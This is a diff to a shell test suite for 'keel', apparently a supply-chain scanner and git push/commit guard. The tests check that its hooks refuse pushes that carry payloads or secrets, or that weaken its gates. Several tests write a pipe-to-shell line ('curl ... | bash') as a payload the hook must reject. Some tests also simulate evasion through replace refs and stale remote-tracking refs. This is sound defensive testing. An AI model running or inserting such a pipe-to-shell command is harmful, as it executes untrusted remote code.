+printf 'test.key an expired fixture, no live credential\n' > "$sp/.keel/scan-allow"
+( cd "$sp" && git add test.key .keel/scan-allow && git commit -qm fixture && git update-ref refs/remotes/origin/main HEAD \
+  && printf 'live\n' > test.key && git commit -qam live && printf 'fixture\n' > test.key && git commit -qam restore ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"test.key [structural-secret-material]"*) ok "scan --push refuses a version of an allowed key the tip does not hold" ;;
+  *) bad "scan --push" "refused, but not for test.key: $out" ;; esac \
+  || bad "scan --push" "allowed a live key at an allowed path because a later commit restored the fixture"
+( cd "$sp" && git rm -q test.key && git commit -qm drop ) >/dev/null 2>&1
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed a live key at an allowed path because a later commit deleted it" \
+  || ok "scan --push refuses a version of an allowed key the tip deleted"
+# The fixture changed once, to the version the tip holds, is the reviewed version and passes.
+( cd "$sp" && git reset -q --hard origin/main && printf 'fixture 2\n' > test.key && git commit -qam "new fixture" ) >/dev/null 2>&1
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
+  && ok "scan --push allows an allowed key changed to the version the tip holds" \
+  || bad "scan --push" "refused an allowed fixture the push changed once, to the tip's version"
+rm -rf "$sp"
+
+# A history version of an allowed key is covered only where .keel/scan-allow pins it, the path then
+# the version's blob: a first push to a remote with no fetched refs walks the whole history, so a
+# fixture that was ever regenerated was otherwise refused on every such push. A pin names one
+# version, so a live key a pushed commit put at the same path is still refused.
+sp="$(fixture node-ts)"
+mkdir -p "$sp/.keel"; printf 'fixture 1\n' > "$sp/test.key"
+printf 'test.key an expired fixture, no live credential\n' > "$sp/.keel/scan-allow"
+( cd "$sp" && git add test.key .keel/scan-allow && git commit -qm fixture && printf 'fixture 2\n' > test.key && git commit -qam regenerated ) >/dev/null 2>&1
+old="$( cd "$sp" && git rev-parse HEAD~1:test.key )"
+( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
+  && bad "scan --push" "allowed an unpinned history version of an allowed key" \
+  || ok "scan --push refuses a history version of an allowed key no pin names"
+printf 'test.key %s the first fixture, regenerated\n' "$old" >> "$sp/.keel/scan-allow"
+( cd "$sp" && git commit -qam pin ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
+[ "$rc" -eq 0 ] && case "$out" in *"ALLOW test.key $old"*) ok "scan --push allows a history version .keel/scan-allow pins, and says so" ;;
+  *) bad "scan --push" "allowed the pinned version without listing it: $out" ;; esac \
+  || bad "scan --push" "refused a history version .keel/scan-allow pins: $out"
+( cd "$sp" && printf 'live\n' > test.key && git commit -qam live && printf 'fixture 2\n' > test.key && git commit -qam restore ) >/dev/null 2>&1
+out="$( cd "$sp" && "$KEEL" scan --push origin HEAD 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"test.key [structural-secret-material]"*) ok "scan --push refuses a version of an allowed key its pin does not name" ;;
+  *) bad "scan --push" "refused, but not for test.key: $out" ;; esac \
+  || bad "scan --push" "allowed a live key because another version of its path is pinned"
+rm -rf "$sp"
+
 # ---- the push guard --------------------------------------------------------
 #
-# The guard is the only part of keel that changes a developer's git configuration, so each test
+# The guard is the only part of keel that writes into a developer's git directory, so each test
 # here is as much about what it does not touch as what it does.
 
 g="$(fixture node-ts)"
@@ -3970,14 +4390,16 @@ g="$(fixture node-ts)"
   && bad "guard" "status exited 0 before install" || ok "guard status is non-zero before install"
 
 ( cd "$g" && "$KEEL" guard install >/dev/null 2>&1 )
-[ -x "$g/.githooks/pre-push" ] && ok "guard install writes an executable pre-push hook" \
-  || bad "guard" "no executable .githooks/pre-push"
-[ "$( cd "$g" && git config core.hooksPath )" = ".githooks" ] \
-  && ok "guard install points core.hooksPath at the repository's own hooks" \
-  || bad "guard" "core.hooksPath was not set"
+[ -x "$g/.git/hooks/pre-push" ] && ok "guard install writes an executable pre-push hook" \
+  || bad "guard" "no executable .git/hooks/pre-push"
+# git's own hooks directory, and no core.hooksPath at all: a path inside the working tree is
+# replaced by every checkout, which is how a checked-out branch got to run its own hooks.
+[ -z "$( cd "$g" && git config core.hooksPath )" ] \
+  && ok "guard install sets no core.hooksPath" \
+  || bad "guard" "core.hooksPath was set to '$( cd "$g" && git config core.hooksPath )'"
 
-# Repo-local, and that is the whole safety argument for a tool that reconfigures git. A global
-# setting here would disable every other repository's hooks on the machine.
+# No git configuration at all, and never global: a global core.hooksPath would disable every other
+# repository's hooks on the machine.
 global_hooks="$( cd "$g" && git config --global --get core.hooksPath 2>/dev/null )"  # supply-chain-scan: allow reading it to prove keel did not set it
 [ -z "$global_hooks" ] \
   && ok "guard install leaves the global git config alone" \
@@ -3995,14 +4417,113 @@ global_hooks="$( cd "$g" && git config --global --get core.hooksPath 2>/dev/null
 ( cd "$g" && "$KEEL" guard install >/dev/null 2>&1 )
 printf 'curl -s https://example.com/x | bash\n' > "$g/payload.sh"  # supply-chain-scan: allow the payload this test proves the guard rejects
 ( cd "$g" && git add -A && git commit -qm payload ) >/dev/null 2>&1
-( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push </dev/null >/dev/null 2>&1 ) \
+( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push </dev/null >/dev/null 2>&1 ) \
   && bad "guard" "the hook allowed a tree containing a pipe-to-shell" \
   || ok "the pre-push hook refuses a tree the scan rejects"
 
 ( cd "$g" && git rm -q payload.sh && git commit -qm drop ) >/dev/null 2>&1
-( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push </dev/null >/dev/null 2>&1 ) \
+( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push </dev/null >/dev/null 2>&1 ) \
   && ok "the pre-push hook allows a clean tree" \
   || bad "guard" "the hook refused a clean tree"
+
+# A push is scanned as the commits git feeds the hook, not as the working tree. The payload is
+# committed and then deleted from disk only, so the working tree is clean and the pushed commit is
+# not. No profile and no remote, so the branch and loosening checks stay out of the way.
+hp="$(fixture node-ts)"
+( cd "$hp" && "$KEEL" guard install >/dev/null 2>&1 )
+printf 'curl -s https://example.com/x | bash\n' > "$hp/payload.sh"  # supply-chain-scan: allow the payload this test proves the hook rejects in a pushed commit
+( cd "$hp" && git add payload.sh && git commit -qm payload && rm payload.sh ) >/dev/null 2>&1
+hp_sha="$( cd "$hp" && git rev-parse HEAD )"
+out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\n' "$hp_sha" '0000000000000000000000000000000000000000' \
+   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"; rc=$?
+[ "$rc" -ne 0 ] && case "$out" in *"payload.sh:1 [net-pipe-shell]"*) ok "the pre-push hook scans the pushed commit, not the working tree" ;;
+  *) bad "guard" "refused, but not for payload.sh: $out" ;; esac \
+  || bad "guard" "the hook allowed a pushed commit carrying a pipe-to-shell the working tree no longer holds"
+
+# A branch and an annotated tag on the same commit, pushed together, are scanned once: the tag's own
+# sha is peeled to the commit before the push's commits are deduplicated.
+( cd "$hp" && git tag -a -m release v1 "$hp_sha" ) >/dev/null 2>&1
+tag_sha="$( cd "$hp" && git rev-parse v1 )"
+out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\nrefs/tags/v1 %s refs/tags/v1 %s\n' "$hp_sha" '0000000000000000000000000000000000000000' "$tag_sha" '0000000000000000000000000000000000000000' \
+   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"
+n="$(printf '%s\n' "$out" | grep -c "scanning $hp_sha")"
+[ "$n" -eq 1 ] && ok "the pre-push hook scans a commit once when a branch and a tag on it are pushed together" \
+  || bad "guard" "scanned $hp_sha $n times for one branch and one tag on it"
+
+# A tag pushed on its own is scanned as the commit it names, and a replace ref standing in front of
+# the tag object changes nothing: the peel ignores replace refs, as keel scan --push does, since
+# they change what git reads and not what push sends.
+clean_c="$( cd "$hp" && git commit-tree -m clean "$hp_sha~1^{tree}" )"
+( cd "$hp" && git tag -a -m release v2 "$hp_sha" ) >/dev/null 2>&1
+v2="$( cd "$hp" && git rev-parse v2 )"
+fake="$( cd "$hp" && printf 'object %s\ntype commit\ntag v2\ntagger t <t@t.t> 0 +0000\n\nfake\n' "$clean_c" | git mktag )"
+( cd "$hp" && git replace -f "$v2" "$fake" ) >/dev/null 2>&1
+( cd "$hp" && printf 'refs/tags/v2 %s refs/tags/v2 %s\n' "$v2" '0000000000000000000000000000000000000000' \
+   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
+  && bad "guard" "the hook allowed a tagged payload a replace ref stands in front of" \
+  || ok "the pre-push hook scans a pushed tag as the commit it really names"
+( cd "$hp" && git replace -d "$v2" ) >/dev/null 2>&1
+
+# A push that only deletes a branch sends no content, so there is nothing to scan.
+( cd "$hp" && printf '(delete) %s refs/heads/topic %s\n' '0000000000000000000000000000000000000000' "$hp_sha" \
+   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
+  && ok "the pre-push hook allows a push that only deletes a branch" \
+  || bad "guard" "the hook refused a push that only deletes a branch"
+
+# A branch delete in a SHA-256 repository sends 64 zeros, not 40, and is still a delete. This case
+# passes before the change too, since the working-tree hook it replaced scanned a clean tree.
+s256="$(mktemp -d)"
+( cd "$s256" && git init -q --object-format=sha256 -b main . && git config user.email t@t.t && git config user.name t \
+  && printf 'a\n' > a.txt && git add a.txt && git commit -qm init && "$KEEL" guard install ) >/dev/null 2>&1
+z64='0000000000000000000000000000000000000000000000000000000000000000'
+( cd "$s256" && printf '(delete) %s refs/heads/old %s\n' "$z64" "$(git rev-parse HEAD)" \
+   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
+  && ok "the pre-push hook allows a branch delete in a SHA-256 repository" \
+  || bad "guard" "the hook refused a branch delete in a SHA-256 repository"
+rm -rf "$s256"
+
+# git runs the hook with its two arguments and nothing on stdin when there is nothing to update. That
+# publishes nothing, so nothing is scanned: an untracked payload on disk refused a no-op push.
+printf 'curl -s https://example.com/x | bash\n' > "$hp/scratch.sh"  # supply-chain-scan: allow an untracked payload a push with nothing to update must not read
+( cd "$hp" && PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git </dev/null >/dev/null 2>&1 ) \
+  && ok "the pre-push hook scans nothing when git feeds it no refs" \
+  || bad "guard" "the hook refused a push with nothing to update over an untracked file on disk"
+rm -f "$hp/scratch.sh"
+
+# A keel on PATH older than the hook has no --push, ignores it, and scans the working tree while
+# reading as a clean scan of the push. The hook asks first, says so, and scans the working tree with
+# it. A stub stands in for the older keel, recording how it is called.
+old_bin="$(mktemp -d)"
+printf '#!/bin/sh\ncase "$1" in\n    --help) echo "  scan                 supply chain scan of this tree" ;;\n    scan) echo "OLD-KEEL-SCAN $*" ;;\nesac\n' > "$old_bin/keel"
+chmod +x "$old_bin/keel"
+out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\n' "$hp_sha" '0000000000000000000000000000000000000000' \
+   | PATH="$old_bin:$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"
+case "$out" in
+    *"OLD-KEEL-SCAN scan --push"*) bad "guard" "the hook handed --push to a keel too old to know it" ;;
+    *"too old"*)
+        case "$out" in
+            *"OLD-KEEL-SCAN scan"*) ok "the pre-push hook says a keel is too old for --push, and scans the working tree with it" ;;
+            *) bad "guard" "said keel was too old but scanned nothing: $out" ;;
+        esac ;;
+    *) bad "guard" "expected the too-old message, got: $out" ;;
+esac
+rm -rf "$old_bin"
+
+# The repository's own tests/supply-chain-scan.sh is never the scanner, even with no keel on PATH:
+# a branch would otherwise be judged by its own, possibly weakened, copy. PATH is cut to the system
+# directories so no keel is reachable.
+mkdir -p "$hp/tests"
+printf '#!/bin/sh\necho REPO-SCANNER-RAN\nexit 0\n' > "$hp/tests/supply-chain-scan.sh"
+chmod +x "$hp/tests/supply-chain-scan.sh"
+out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\n' "$hp_sha" '0000000000000000000000000000000000000000' \
+   | PATH="/usr/bin:/bin" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"; rc=$?
+if [ "$rc" -ne 0 ]; then bad "guard" "the hook refused with no keel on PATH: $out"
+else case "$out" in
+    *REPO-SCANNER-RAN*) bad "guard" "the hook ran the repository's own scanner" ;;
+    *"not on PATH"*) ok "the pre-push hook never runs the repository's own scanner, and says when nothing was scanned" ;;
+    *) bad "guard" "expected the no-keel message, got: $out" ;;
+esac; fi
+rm -rf "$hp"
 
 # The default-branch refusal. A push feeds the hook its refs on stdin, and that is the only thing
 # telling a push to the default branch apart from a push to a topic branch, so the test feeds them
@@ -4011,7 +4532,7 @@ head_sha="$( cd "$g" && git rev-parse HEAD )"
 push_to() {
     ( cd "$g" \
       && printf 'refs/heads/local %s %s %s\n' "$head_sha" "$1" '0000000000000000000000000000000000000000' \
-       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 )
+       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 )
 }
 
 # No profile and no remote, so nothing states what the default branch is. The hook checks nothing
@@ -4076,7 +4597,7 @@ old_sha="$( cd "$rt" && git rev-parse HEAD )"
 new_sha="$( cd "$rt" && git rev-parse HEAD )"
 
 out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$new_sha" "$old_sha" \
-       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
+       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
 rc=$?
 [ "$rc" -ne 0 ] && ok "pre-push refuses a push that loosens gates.commit_guard" \
   || bad "guard" "pre-push allowed a push that turned gates.commit_guard from required to off"
@@ -4090,20 +4611,25 @@ esac
 ( cd "$rt" && git add -A && git commit -q -m "tighten it back" )
 tight_sha="$( cd "$rt" && git rev-parse HEAD )"
 ( cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$tight_sha" "$new_sha" \
-    | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
+    | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
   && ok "pre-push allows a push that tightens a gate" \
   || bad "guard" "pre-push refused a push that only tightened gates.commit_guard"
 
 # an unrecognized value, not "required", "warn" or "off", such as a typo, must be treated as a
 # loosening too. The pre-commit hook's own case statement (`bin/keel#case "$gate" in`) already
 # treats anything but required/warn as fully off, so this is a real value a profile can hold, not
-# a contrived one, and `keel profile set` writes it as a plain JSON string with no validation of
-# its own.
-( cd "$rt" && "$KEEL" profile set gates.commit_guard disabled >/dev/null 2>&1 )
+# a contrived one. `keel profile set` refuses it now, but a hand edit or an older keel still writes
+# one, so the value is written directly.
+python3 - "$rt/.keel/profile.json" <<'PY'
+import json, sys
+p = json.load(open(sys.argv[1]))
+p["gates"]["commit_guard"] = "disabled"
+json.dump(p, open(sys.argv[1], "w"), indent=2)
+PY
 ( cd "$rt" && git add -A && git commit -q -m "commit_guard set to an unrecognized value" )
 bad_val_sha="$( cd "$rt" && git rev-parse HEAD )"
 out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$bad_val_sha" "$tight_sha" \
-       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
+       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
 case "$out" in
   *"gates.commit_guard"*) ok "pre-push refuses gates.commit_guard set to an unrecognized value" ;;
   *) bad "guard" "gates.commit_guard set to an unrecognized string was not refused. Got: $out" ;;
@@ -4119,7 +4645,7 @@ esac
 # no real remote; a remote-tracking ref pointing at the strong baseline is all the hook reads.
 ( cd "$rt" && git update-ref refs/remotes/origin/main "$old_sha" )
 ( cd "$rt" && printf 'refs/heads/weak %s refs/heads/weak %s\n' "$new_sha" "0000000000000000000000000000000000000000" \
-    | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
+    | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
   && bad "guard" "pre-push allowed a first push of a branch whose profile is weaker than origin/main" \
   || ok "pre-push refuses a first push that is weaker than the remote default branch"
 
@@ -4133,7 +4659,7 @@ str_sha="$( cd "$rt" && git rev-parse HEAD )"
 ( cd "$rt" && git add -A && git commit -q -m "verify.test is now JSON true" )
 bool_sha="$( cd "$rt" && git rev-parse HEAD )"
 out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$bool_sha" "$str_sha" \
-       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
+       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
 case "$out" in
   *"verify.test"*) ok "pre-push refuses verify.test becoming a non-string" ;;
   *) bad "guard" "verify.test turned from a string into true and the push was not refused. Got: $out" ;;
@@ -4148,7 +4674,7 @@ sec_str_sha="$( cd "$rt" && git rev-parse HEAD )"
 ( cd "$rt" && git add -A && git commit -q -m "verify.security is now null" )
 sec_null_sha="$( cd "$rt" && git rev-parse HEAD )"
 out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$sec_null_sha" "$sec_str_sha" \
-       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
+       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
 case "$out" in
   *"verify.security"*) ok "pre-push refuses verify.security going from a command to null" ;;
   *) bad "guard" "verify.security turned null and the push was not refused. Got: $out" ;;
@@ -4165,7 +4691,7 @@ PY
 ( cd "$rt" && git add -A && git commit -q -m "remove gates.commit_guard entirely" )
 gate_del_sha="$( cd "$rt" && git rev-parse HEAD )"
 out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$gate_del_sha" "$sec_null_sha" \
-       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
+       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
 case "$out" in
   *"gates.commit_guard"*) ok "pre-push refuses a push that removes gates.commit_guard entirely" ;;
   *) bad "guard" "removing gates.commit_guard was not refused. Got: $out" ;;
@@ -4176,7 +4702,7 @@ esac
 ( cd "$rt" && git rm -q .keel/profile.json && git commit -q -m "delete the profile" )
 del_sha="$( cd "$rt" && git rev-parse HEAD )"
 out="$(cd "$rt" && printf 'refs/heads/main %s refs/heads/main %s\n' "$del_sha" "$gate_del_sha" \
-       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
+       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
 case "$out" in
   *"profile.json"*"deleted"*) ok "pre-push refuses a push that deletes .keel/profile.json" ;;
   *) bad "guard" "deleting .keel/profile.json was not refused. Got: $out" ;;
@@ -4194,7 +4720,7 @@ esac
 ( cd "$rt" && git rm -q .keel/profile.json && git commit -q -m "first push of a new branch, profile gone" )
 new_branch_sha="$( cd "$rt" && git rev-parse HEAD )"
 out="$(cd "$rt" && printf 'refs/heads/brand-new %s refs/heads/brand-new %s\n' "$new_branch_sha" "0000000000000000000000000000000000000000" \
-       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
+       | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
 case "$out" in
   *"profile.json"*"deleted"*) ok "pre-push refuses a first push of a new branch that deletes the profile" ;;
   *) bad "guard" "first push of a new branch deleting the profile was not refused. Got: $out" ;;
@@ -4223,26 +4749,57 @@ old_sha2="$( cd "$pp" && git rev-parse HEAD )"
 ( cd "$pp" && git add -A && git commit -q -m "unrelated edit, nothing loosened" )
 new_sha2="$( cd "$pp" && git rev-parse HEAD )"
 pp_out="$(cd "$pp" && printf 'refs/heads/main %s refs/heads/main %s\n' "$new_sha2" "$old_sha2" \
-   | PATH="$storeshim2:$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
+   | PATH="$storeshim2:$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1)"
 pp_rc=$?
 [ "$pp_rc" -eq 0 ] \
   && ok "pre-push does not mistake a Store-alias python3's not-found message for a loosening report" \
   || bad "guard" "pre-push refused a push that loosened nothing, with a Store-alias python3 on PATH. Got: $pp_out"
 rm -rf "$pp" "$storeshim2"
 
+# --- pre-push: a push source holding a space ------------------------------------------------
+# git hands the hook each push source as written, and `:/fix HEAD`, a commit named by its message,
+# holds a space. Split on spaces from the left, the local sha read as HEAD, so the scan read HEAD
+# and not the commit being pushed, and the remote ref read as a sha, so a push to the default branch
+# was not recognised as one. A real push into a bare remote, since the line is git's to write.
+sp="$(fixture node-ts)"; git init -q --bare "$sp.remote"
+( cd "$sp" && git remote add origin "$sp.remote" && "$KEEL" guard install ) >/dev/null 2>&1
+printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload a spaced push source tries to slip past the hook
+( cd "$sp" && git add payload.sh && git commit -qm "fix HEAD" && git rm -q payload.sh && git commit -qm clean ) >/dev/null 2>&1
+( cd "$sp" && PATH="$(dirname "$KEEL"):$PATH" git push -q origin ':/fix HEAD:refs/heads/x' >/dev/null 2>&1 ) \
+  && bad "guard" "the hook allowed a payload pushed from a source holding a space" \
+  || ok "the pre-push hook scans the commit a source holding a space names"
+( cd "$sp" && "$KEEL" init -y && git add -A && git commit -qm "tidy HEAD" ) >/dev/null 2>&1
+out="$( cd "$sp" && PATH="$(dirname "$KEEL"):$PATH" git push -q origin ':/tidy HEAD:refs/heads/main' 2>&1 )"
+case "$out" in *"is the default branch"*) ok "the pre-push hook refuses a push to the default branch from a source holding a space" ;;
+  *) bad "guard" "a push to main from a source holding a space was not refused as one: $out" ;; esac
+rm -rf "$sp" "$sp.remote"
+
+# --- pre-push: a remote-tracking ref is not the remote ------------------------------------------
+# A remote-tracking ref records what was last fetched, possibly from another URL, and not what the
+# remote being pushed to holds. A skip for commits one already reached published a payload unscanned
+# once `git remote set-url` pointed the remote somewhere new.
+sp="$(fixture node-ts)"; git init -q --bare "$sp.old"; git init -q --bare "$sp.new"
+printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload a stale remote-tracking ref tries to wave through
+( cd "$sp" && git remote add origin "$sp.old" && git add payload.sh && git commit -qm payload \
+  && git push -q origin HEAD:refs/heads/topic && git remote set-url origin "$sp.new" && "$KEEL" guard install ) >/dev/null 2>&1
+( cd "$sp" && PATH="$(dirname "$KEEL"):$PATH" git push -q origin HEAD:refs/heads/topic >/dev/null 2>&1 ) \
+  && bad "guard" "the hook allowed a payload because a stale remote-tracking ref reached it" \
+  || ok "the pre-push hook scans a commit a remote-tracking ref already reaches"
+rm -rf "$sp" "$sp.old" "$sp.new"
+
 # The hook body lives inside a quoted heredoc, so the repo's own lint reads it as a string and never
 # parses it. Linting the generated file is the only way that code gets checked at all.
 if command -v shellcheck >/dev/null 2>&1; then
-    shellcheck -s bash "$g/.githooks/pre-push" >/dev/null 2>&1 \
+    shellcheck -s bash "$g/.git/hooks/pre-push" >/dev/null 2>&1 \
       && ok "the generated pre-push hook is shellcheck clean" \
-      || bad "guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$g/.githooks/pre-push" 2>&1 | head -3)"
+      || bad "guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$g/.git/hooks/pre-push" 2>&1 | head -3)"
 else
     printf '  SKIP  shellcheck is absent, so the generated hook was not linted\n'
 fi
 
 ( cd "$g" && "$KEEL" guard uninstall >/dev/null 2>&1 )
-[ -z "$( cd "$g" && git config core.hooksPath 2>/dev/null )" ] \
-  && ok "guard uninstall clears core.hooksPath" || bad "guard" "core.hooksPath survived uninstall"
+[ ! -e "$g/.git/hooks/pre-push" ] \
+  && ok "guard uninstall removes the pre-push hook" || bad "guard" "pre-push survived uninstall"
 rm -rf "$g"
 
 # ---- the commit guard ------------------------------------------------------
@@ -4255,8 +4812,8 @@ c="$(fixture node-ts)"
 ( cd "$c" && "$KEEL" init -y >/dev/null 2>&1 )
 ( cd "$c" && "$KEEL" guard install >/dev/null 2>&1 )
 
-[ -x "$c/.githooks/pre-commit" ] && ok "guard install writes an executable pre-commit hook" \
-  || bad "commit guard" "no executable .githooks/pre-commit"
+[ -x "$c/.git/hooks/pre-commit" ] && ok "guard install writes an executable pre-commit hook" \
+  || bad "commit guard" "no executable .git/hooks/pre-commit"
 
 gate_of() { python3 -c "import json;print(json.load(open('$1/.keel/profile.json'))['gates'].get('commit_guard'))" 2>/dev/null; }
 [ "$(gate_of "$c")" = "off" ] && ok "init writes gates.commit_guard off by default" \
@@ -4264,7 +4821,7 @@ gate_of() { python3 -c "import json;print(json.load(open('$1/.keel/profile.json'
 
 # Off is off, and this fixture proves it rather than asserting it: its lint is `eslint .`, which is
 # not installed here, so a hook that read the gate wrongly would fail on this line.
-( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
+( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 ) \
   && ok "the pre-commit hook is inert while gates.commit_guard is off" \
   || bad "commit guard" "the hook ran its checks with the gate off"
 
@@ -4273,11 +4830,11 @@ gate_of() { python3 -c "import json;print(json.load(open('$1/.keel/profile.json'
 ( cd "$c" && "$KEEL" profile set verify.format_fix 'npm run format' >/dev/null 2>&1 )
 ( cd "$c" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
 
-( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
+( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 ) \
   && bad "commit guard" "the hook allowed a commit past a failing verify command" \
   || ok "the pre-commit hook refuses when a verify command fails"
 
-out="$( cd "$c" && .githooks/pre-commit 2>&1 )"
+out="$( cd "$c" && .git/hooks/pre-commit 2>&1 )"
 case "$out" in *"npm run format"*) ok "the refusal names verify.format_fix as the remedy" ;;
   *) bad "commit guard" "the refusal did not name format_fix" ;; esac
 case "$out" in *"--no-verify"*) ok "the refusal names the escape hatch" ;;
@@ -4286,13 +4843,13 @@ case "$out" in *"--no-verify"*) ok "the refusal names the escape hatch" ;;
 # It checks and never rewrites. A hook that reformatted the tree would put content into a commit
 # its author never read, which is the reason this gate refuses instead of fixing.
 before="$( cd "$c" && git status --porcelain )"
-( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 )
+( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 )
 [ "$( cd "$c" && git status --porcelain )" = "$before" ] \
   && ok "the refusing hook leaves the working tree alone" \
   || bad "commit guard" "the hook modified the tree"
 
 ( cd "$c" && "$KEEL" profile set gates.commit_guard warn >/dev/null 2>&1 )
-( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
+( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 ) \
   && ok "warn reports the failure and allows the commit" \
   || bad "commit guard" "warn refused the commit"
 
@@ -4302,7 +4859,7 @@ before="$( cd "$c" && git status --porcelain )"
 ( cd "$c" && "$KEEL" profile set verify.format 'test 1 = 1' >/dev/null 2>&1 )
 ( cd "$c" && "$KEEL" profile set verify.lint 'eslint {path}' >/dev/null 2>&1 )
 ( cd "$c" && "$KEEL" profile set verify.typecheck null >/dev/null 2>&1 )
-( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
+( cd "$c" && .git/hooks/pre-commit >/dev/null 2>&1 ) \
   && ok "the hook skips null and templated commands and allows the commit" \
   || bad "commit guard" "the hook ran a null or templated command"
 
@@ -4316,9 +4873,9 @@ printf '%s\n' "$gs_out" | grep -qi "commit guard" \
   || bad "commit guard" "status said nothing about the commit guard. Got: [$gs_out] core.hooksPath=[$( cd "$c" && git config core.hooksPath 2>/dev/null )] fixture=[$c]"
 
 if command -v shellcheck >/dev/null 2>&1; then
-    shellcheck -s bash "$c/.githooks/pre-commit" >/dev/null 2>&1 \
+    shellcheck -s bash "$c/.git/hooks/pre-commit" >/dev/null 2>&1 \
       && ok "the generated pre-commit hook is shellcheck clean" \
-      || bad "commit guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$c/.githooks/pre-commit" 2>&1 | head -3)"
+      || bad "commit guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$c/.git/hooks/pre-commit" 2>&1 | head -3)"
 else
